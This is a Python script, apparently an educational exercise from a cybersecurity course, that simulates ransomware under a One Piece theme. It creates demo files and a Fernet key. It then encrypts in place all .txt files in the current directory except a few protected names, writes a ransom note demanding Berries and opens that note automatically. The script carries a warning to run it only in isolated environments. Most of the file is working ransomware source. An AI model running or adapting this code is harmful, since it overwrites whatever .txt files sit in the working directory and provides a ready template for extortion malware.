#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║     🏴‍☠️  OPERAÇÃO BUSTER CALL — RANSOMWARE SIM       ║
║          Project Poneglyph | Cybersecurity DIO       ║
╚══════════════════════════════════════════════════════╝

⚠️  AVISO: Script de uso EXCLUSIVAMENTE educacional.
    Execute apenas em ambientes isolados (VM / sandbox).
"""

import os
import subprocess
from cryptography.fernet import Fernet

# ── Constantes ────────────────────────────────────────────────────────────────
KEY_FILE     = "log_pose.key"
RANSOM_NOTE  = "RESGATE_BERRIES.txt"
TARGET_EXT   = ".txt"

# Arquivos que o ransomware NÃO deve tocar
PROTECTED_FILES = {RANSOM_NOTE, "readme.txt", "README.md"}

RANSOM_MESSAGE = """\
╔══════════════════════════════════════════════════════════╗
║   🏴‍☠️  SEUS ARQUIVOS FORAM SEQUESTRADOS PELA CP9!  🏴‍☠️   ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  A Marinha iniciou um BUSTER CALL em seus dados.         ║
║  Todos os seus documentos (.txt) foram criptografados.   ║
║                                                          ║
║  Para recuperar seus tesouros:                           ║
║                                                          ║
║    1. NÃO delete o arquivo  'log_pose.key'               ║
║    2. NÃO desligue ou reinicie o sistema                 ║
║    3. Envie 100.000.000 de Berries ao Porto de Water 7   ║
║                                                          ║
║  Caso contrário, a chave será destruída e seus dados     ║
║  serão perdidos para sempre na Grand Line!               ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
"""

# ── Funções ───────────────────────────────────────────────────────────────────

def gerar_log_pose() -> bytes:
    """Gera e persiste a chave simétrica Fernet (a 'Log Pose')."""
    chave = Fernet.generate_key()
    with open(KEY_FILE, "wb") as kf:
        kf.write(chave)
    print(f"[*] Log Pose gerada e salva em '{KEY_FILE}'.")
    return chave


def listar_alvos() -> list[str]:
    """Retorna arquivos .txt elegíveis para criptografia."""
    return [
        f for f in os.listdir(".")
        if f.endswith(TARGET_EXT) and f not in PROTECTED_FILES
    ]


def buster_call_ataque(chave: bytes) -> None:
    """Criptografa todos os arquivos-alvo no diretório atual."""
    fernet = Fernet(chave)
    alvos  = listar_alvos()

    if not alvos:
        print("[!] Nenhum tesouro (.txt) encontrado para atacar.")
        return

    print(f"\n[*] {len(alvos)} arquivo(s) encontrado(s). Iniciando criptografia...\n")
    sucessos = 0

    for arquivo in alvos:
        try:
            with open(arquivo, "rb") as f:
                dados = f.read()
            with open(arquivo, "wb") as f:
                f.write(fernet.encrypt(dados))
            print(f"  [X] '{arquivo}' — atingido pelo Buster Call!")
            sucessos += 1
        except Exception as e:
            print(f"  [!] Erro ao atacar '{arquivo}': {e}")

    print(f"\n[*] {sucessos}/{len(alvos)} arquivo(s) criptografado(s).")


def lancar_nota_resgate() -> None:
    """Cria a nota de resgate e tenta exibi-la automaticamente."""
    with open(RANSOM_NOTE, "w", encoding="utf-8") as f:
        f.write(RANSOM_MESSAGE)

    print(f"[!] Nota de resgate criada: '{RANSOM_NOTE}'.")

    try:
        if os.name == "nt":           # Windows
            os.startfile(RANSOM_NOTE)
        elif os.uname().sysname == "Darwin":  # macOS
            subprocess.call(["open", RANSOM_NOTE])
        else:                          # Linux
            subprocess.call(["xdg-open", RANSOM_NOTE])
    except Exception:
        pass  # Abertura automática é opcional; falha silenciosamente


def criar_ambiente_demo() -> None:
    """Cria arquivos de exemplo para demonstrar o ataque."""
    demo_files = {
        "diario_de_oden.txt":  "Eu, Kozuki Oden, vivi sem arrependimentos!\n"
                               "Neste diário registro os segredos da Ilha de Wano...",
        "projeto_pluton.txt":  "Localização da antiga arma Pluton: [CLASSIFICADO]\n"
                               "Coordenadas: 24°N 142°O — Ilha de Wano.",
    }
    print("[*] Criando arquivos de demonstração...")
    for nome, conteudo in demo_files.items():
        if not os.path.exists(nome):   # Não sobrescreve se já existir
            with open(nome, "w", encoding="utf-8") as f:
                f.write(conteudo)
            print(f"  [+] '{nome}' criado.")


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 56)
    print("  🏴‍☠️  PROTOCOLO BUSTER CALL — INICIANDO...  🏴‍☠️")
    print("=" * 56)

    # 1. Prepara o ambiente de demonstração
    criar_ambiente_demo()

    # 2. Gera a chave de criptografia
    chave = gerar_log_pose()

    # 3. Executa a criptografia
    buster_call_ataque(chave)

    # 4. Exibe a nota de resgate
    lancar_nota_resgate()

    print("\n[!] Operação finalizada. Todos os alvos foram neutralizados.")
    print(f"[!] Para reverter, execute:  python3 restauracao_sunny.py\n")
